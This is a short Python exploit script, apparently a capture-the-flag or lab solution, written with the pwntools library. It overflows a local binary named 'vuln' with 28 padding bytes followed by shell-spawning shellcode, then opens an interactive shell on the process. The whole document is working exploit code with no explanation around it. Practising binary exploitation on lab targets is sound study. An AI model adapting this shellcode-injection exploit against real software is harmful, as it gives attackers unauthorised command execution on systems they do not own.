from pwn import *

exe = ELF("../vuln")
context.binary = exe

payload = b'A' * 28 + asm(shellcraft.sh())

p = process('../vuln')
p.sendlineafter(b'text:\n', payload)

print(p.clean())
p.interactive()
p.close()